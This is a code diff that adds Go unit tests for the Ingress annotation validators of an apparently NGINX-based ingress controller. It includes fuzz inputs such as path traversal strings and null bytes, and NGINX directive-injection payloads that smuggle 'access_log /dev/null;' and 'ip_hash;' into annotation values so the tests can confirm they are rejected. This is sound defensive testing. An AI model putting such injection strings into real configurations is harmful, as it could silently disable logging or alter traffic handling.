+		"valid,INVALID_case,good-one,/empty-ns,ns/,123_bad,valid.policy,ns.good/policy.name",
+		"😀/🚀,valid-ns/good-policy,bad ns/policy,ns/bad policy",
+		strings.Repeat("a.", 50) + "/" + strings.Repeat("b-", 50),
+
+		// Edge cases around validation
+		strings.Repeat("a", 63) + "." + strings.Repeat("b", 63), // Max length with dot
+		"a" + strings.Repeat("-a", 31),                          // Alternating pattern
+		strings.Repeat("1", 63) + "/" + strings.Repeat("2", 63), // All numbers
+
+		// Pathological cases
+		string(make([]byte, 1000)),          // Null bytes
+		strings.Repeat("\x00\x01\x02", 100), // Control characters
+		strings.Repeat("../", 100),          // Path traversal
+		strings.Repeat("a/", 100),           // Many slashes
+	}
+
+	for i, input := range fuzzyInputs {
+		t.Run(fmt.Sprintf("fuzzy_test_%d", i), func(t *testing.T) {
+			context := &annotationValidationContext{
+				value:     input,
+				fieldPath: field.NewPath("fuzzy"),
+			}
+
+			// Just ensure the function doesn't panic and returns something
+			func() {
+				defer func() {
+					if r := recover(); r != nil {
+						t.Errorf("Function panicked with input %q: %v", input, r)
+					}
+				}()
+
+				errors := validatePolicyNames(context)
+
+				// For fuzzy testing, we mainly care about:
+				// 1. No panics
+				// 2. Function returns (even if with errors)
+				// 3. Errors are properly formed if they exist
+				for _, err := range errors {
+					if err.Field == "" {
+						t.Errorf("Error missing field path for input %q: %v", input, err)
+					}
+					if err.Detail == "" {
+						t.Errorf("Error missing detail for input %q: %v", input, err)
+					}
+				}
+			}()
+		})
+	}
+}
+
+// TestValidatePolicyNamesEdgeCases tests specific edge cases and boundary conditions
+func TestValidatePolicyNamesEdgeCases(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name         string
+		value        string
+		expectErrors bool
+		description  string
+	}{
+		{
+			name:         "single character policy",
+			value:        "a",
+			expectErrors: false,
+			description:  "Single character should be valid",
+		},
+		{
+			name:         "single character namespace and policy",
+			value:        "a/b",
+			expectErrors: false,
+			description:  "Single character namespace and policy should be valid",
+		},
+		{
+			name:         "maximum length valid policy",
+			value:        strings.Repeat("a", 253),
+			expectErrors: false,
+			description:  "253 character policy name should be valid (DNS label max)",
+		},
+		{
+			name:         "over maximum length policy",
+			value:        strings.Repeat("a", 254),
+			expectErrors: true,
+			description:  "253+ character policy name should be invalid",
+		},
+		{
+			name:         "policy with all valid DNS chars",
+			value:        "policy-123.test",
+			expectErrors: false,
+			description:  "Policy with hyphens, numbers, and dots should be valid",
+		},
+		{
+			name:         "namespaced policy with all valid DNS chars",
+			value:        "namespace-123.test/policy-456.example",
+			expectErrors: false,
+			description:  "Namespaced policy with valid DNS chars should work",
+		},
+		{
+			name:         "policy name that looks like IP but is valid DNS",
+			value:        "policy.1.2.3",
+			expectErrors: false,
+			description:  "DNS subdomain that looks like IP should be valid",
+		},
+		{
+			name:         "namespace and policy both at max length",
+			value:        strings.Repeat("a", 253) + "/" + strings.Repeat("b", 253),
+			expectErrors: false,
+			description:  "Both namespace and policy at max length should be valid",
+		},
+		{
+			name:         "deeply nested path treated as single policy name",
+			value:        "ns/very/deep/nested/path/policy",
+			expectErrors: true,
+			description:  "Only first slash matters, rest is part of policy name",
+		},
+		{
+			name:         "policy with all numbers",
+			value:        "123456789",
+			expectErrors: false,
+			description:  "All numeric policy names should be valid",
+		},
+		{
+			name:         "namespace and policy with all numbers",
+			value:        "123/456",
+			expectErrors: false,
+			description:  "All numeric namespace and policy should be valid",
+		},
+		{
+			name:         "policy starting with number and containing letters",
+			value:        "1abc.2def-3ghi",
+			expectErrors: false,
+			description:  "Policy starting with number should be valid",
+		},
+		{
+			name:         "many dot-separated segments",
+			value:        strings.Repeat("a.", 20) + "policy",
+			expectErrors: false,
+			description:  "Many dot-separated segments should be valid if within length limits",
+		},
+		{
+			name:         "policy name exactly at boundary with dots",
+			value:        "a." + strings.Repeat("b", 251),
+			expectErrors: false,
+			description:  "Policy at exactly 253 chars with dot should be valid",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			context := &annotationValidationContext{
+				value:     tt.value,
+				fieldPath: field.NewPath("edge_case"),
+			}
+
+			errors := validatePolicyNames(context)
+
+			if tt.expectErrors && len(errors) == 0 {
+				t.Errorf("%s: Expected errors but got none for input %q", tt.description, tt.value)
+			}
+			if !tt.expectErrors && len(errors) > 0 {
+				t.Errorf("%s: Expected no errors but got %v for input %q", tt.description, errors, tt.value)
+			}
+		})
+	}
+}
+
+// TestValidatePolicyNamesCommaHandling tests specific comma and whitespace handling
+func TestValidatePolicyNamesCommaHandling(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name           string
+		value          string
+		expectErrors   bool
+		expectedErrMsg []string
+	}{
+		{
+			name:         "no commas single policy",
+			value:        "simple-policy",
+			expectErrors: false,
+		},
+		{
+			name:         "two policies with comma",
+			value:        "policy1,policy2",
+			expectErrors: false,
+		},
+		{
+			name:         "policies with spaces around comma",
+			value:        "policy1 , policy2",
+			expectErrors: false,
+		},
+		{
+			name:         "policies with tabs and spaces",
+			value:        "policy1\t,\t policy2 ",
+			expectErrors: false,
+		},
+		{
+			name:         "policies with various whitespace",
+			value:        " policy1 \t, \n policy2 \r ",
+			expectErrors: false,
+		},
+		{
+			name:           "empty policy between commas",
+			value:          "policy1,,policy2",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "trailing comma",
+			value:          "policy1,policy2,",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "leading comma",
+			value:          ",policy1,policy2",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "only commas",
+			value:          ",,,",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "whitespace between commas",
+			value:          "policy1,  ,policy2",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:           "tabs between commas",
+			value:          "policy1,\t\t,policy2",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+		{
+			name:         "many valid policies",
+			value:        "p1,p2,p3,p4,p5,ns1/p6,ns2/p7,p8,p9,p10",
+			expectErrors: false,
+		},
+		{
+			name:         "many valid policies with whitespace",
+			value:        " p1 , p2 , p3 , ns1/p4 , ns2/p5 ",
+			expectErrors: false,
+		},
+		{
+			name:           "mixed valid and empty policies",
+			value:          "valid1,,valid2,,valid3",
+			expectErrors:   true,
+			expectedErrMsg: []string{"policy name cannot be empty"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			context := &annotationValidationContext{
+				value:     tt.value,
+				fieldPath: field.NewPath("comma_test"),
+			}
+
+			errors := validatePolicyNames(context)
+
+			if tt.expectErrors {
+				if len(errors) == 0 {
+					t.Errorf("Expected validation errors for %q, but got none", tt.value)
+					return
+				}
+
+				for _, expectedMsg := range tt.expectedErrMsg {
+					found := false
+					for _, err := range errors {
+						if strings.Contains(err.Detail, expectedMsg) {
+							found = true
+							break
+						}
+					}
+					if !found {
+						t.Errorf("Expected error message %q not found in errors: %v", expectedMsg, errors)
+					}
+				}
+			} else {
+				if len(errors) > 0 {
+					t.Errorf("Expected no validation errors for %q, but got: %v", tt.value, errors)
+				}
+			}
+		})
+	}
+}
+
+func TestValidateIngress_SSLAnnotations(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		name        string
+		annotations map[string]string
+		expectError bool
+	}{
+		{
+			name: "valid ssl-ciphers",
+			annotations: map[string]string{
+				"nginx.org/ssl-ciphers": "DEFAULT:@SECLEVEL=2,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
+			},
+			expectError: false,
+		},
+		{
+			name: "invalid ssl-ciphers with quotes and semicolon breakout",
+			annotations: map[string]string{
+				"nginx.org/ssl-ciphers": "HIGH:!aNULL\"; access_log /dev/null;",
+			},
+			expectError: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			ing := &networking.Ingress{
+				ObjectMeta: meta_v1.ObjectMeta{
+					Name:        "test-ingress",
+					Namespace:   "default",
+					Annotations: tt.annotations,
+				},
+				Spec: networking.IngressSpec{
+					Rules: []networking.IngressRule{
+						{
+							Host: "example.com",
+						},
+					},
+				},
+			}
+			errs := validateIngress(ing, false, false, false, false, false, false)
+			if tt.expectError && len(errs) == 0 {
+				t.Errorf("expected error for annotations %v, got none", tt.annotations)
+			}
+			if !tt.expectError && len(errs) > 0 {
+				t.Errorf("expected no error for annotations %v, got %v", tt.annotations, errs)
+			}
+		})
+	}
+}
+
+// TestValidateLBMethodAnnotationRejectsNonASCIIWhitespaceInjection covers the
+// hash lb-method annotation against a payload that hides a directive injection
+// behind a non-ASCII space. U+00A0 is not an NGINX token separator, so the
+// single quote after it is mid-token and inert and NGINX ends the hash directive
+// at the first ';', parsing the injected ip_hash. The shared directive scanner
+// must treat only NGINX's ASCII whitespace as separators and reject this.
+func TestValidateLBMethodAnnotationRejectsNonASCIIWhitespaceInjection(t *testing.T) {
+	t.Parallel()
+
+	for _, isPlus := range []bool{false, true} {
+		context := &annotationValidationContext{
+			value:     "hash $remote_addr\u00a0';ip_hash;#' consistent",
+			isPlus:    isPlus,
+			fieldPath: field.NewPath("annotations").Child("nginx.org/lb-method"),
+		}
+		if errs := validateLBMethodAnnotation(context); len(errs) == 0 {
+			t.Errorf("validateLBMethodAnnotation(isPlus=%v) accepted a non-ASCII-whitespace injection payload, want an error", isPlus)
+		}
+	}
+}
+
+// TestValidateProxyRedirectFromRegexUsesNGINXUnescaping ensures the proxy-redirect-from
+// regex is validated as NGINX's PCRE engine will see it. proxy_redirect renders
+// the value unquoted, so NGINX collapses \\ to a lone trailing \ before compiling;
+// a pattern that compiles as written must still be rejected when its post-unescape
+// form is an invalid regex, so an accepted annotation cannot fail nginx -t.
+func TestValidateProxyRedirectFromRegexUsesNGINXUnescaping(t *testing.T) {
+	t.Parallel()
+
+	context := &annotationValidationContext{
+		value:     `~^/foo\\`,
+		fieldPath: field.NewPath("annotations").Child("nginx.org/proxy-redirect-from"),
+	}
+	if errs := validateProxyRedirectFromAnnotation(context); len(errs) == 0 {
+		t.Errorf("validateProxyRedirectFromAnnotation(%q) returned no errors; NGINX unescapes it to a lone trailing backslash that PCRE rejects", context.value)
+	}
+}
+
+func TestValidateProxyHTTPVersionAnnotation(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		value   string
+		isValid bool
+		msg     string
+	}{
+		{value: "1.0", isValid: true, msg: "HTTP/1.0"},
+		{value: "1.1", isValid: true, msg: "HTTP/1.1"},
+		{value: "2", isValid: true, msg: "HTTP/2"},
+		{value: "1.2", isValid: false, msg: "non-existent minor version"},
+		{value: "3", isValid: false, msg: "unsupported major version"},
+		{value: "2.0", isValid: false, msg: "HTTP/2 must be spelled 2, not 2.0"},
+		{value: "1.0.0", isValid: false, msg: "three-part version"},
+		{value: "abc", isValid: false, msg: "not a version"},
+		{value: " 1.1", isValid: false, msg: "leading whitespace is not trimmed"},
+		{value: "1.1;", isValid: false, msg: "directive terminator"},
+	}
+
+	for _, test := range tests {
+		t.Run(test.msg, func(t *testing.T) {
+			t.Parallel()
+
+			context := &annotationValidationContext{
+				value:     test.value,
+				fieldPath: field.NewPath("annotations").Child(configs.ProxyHTTPVersionAnnotation),
+			}
+
+			allErrs := validateProxyHTTPVersionAnnotation(context)
+			if test.isValid && len(allErrs) != 0 {
+				t.Errorf("validateProxyHTTPVersionAnnotation(%q) returned errors %v for valid input", test.value, allErrs)
+			}
+			if !test.isValid && len(allErrs) == 0 {
+				t.Errorf("validateProxyHTTPVersionAnnotation(%q) returned no errors for invalid input", test.value)
+			}
+		})
+	}
+}
+
+// An annotation that is present but blank is a user mistake rather than "unset", so the
+// validation chain must reject it even though the shared validator treats "" as unset.
+func TestValidateProxyHTTPVersionAnnotationRejectsEmptyValue(t *testing.T) {
+	t.Parallel()
+
+	validators, exists := annotationValidations[configs.ProxyHTTPVersionAnnotation]
+	if !exists {
+		t.Fatalf("no validators registered for %s", configs.ProxyHTTPVersionAnnotation)
+	}
+
+	context := &annotationValidationContext{
+		value:     "",
+		fieldPath: field.NewPath("annotations").Child(configs.ProxyHTTPVersionAnnotation),
+	}
+
+	var allErrs field.ErrorList
+	for _, validate := range validators {
+		allErrs = append(allErrs, validate(context)...)
+	}
+
+	if len(allErrs) == 0 {
+		t.Errorf("%s with an empty value was accepted; want an error", configs.ProxyHTTPVersionAnnotation)
+	}
+}
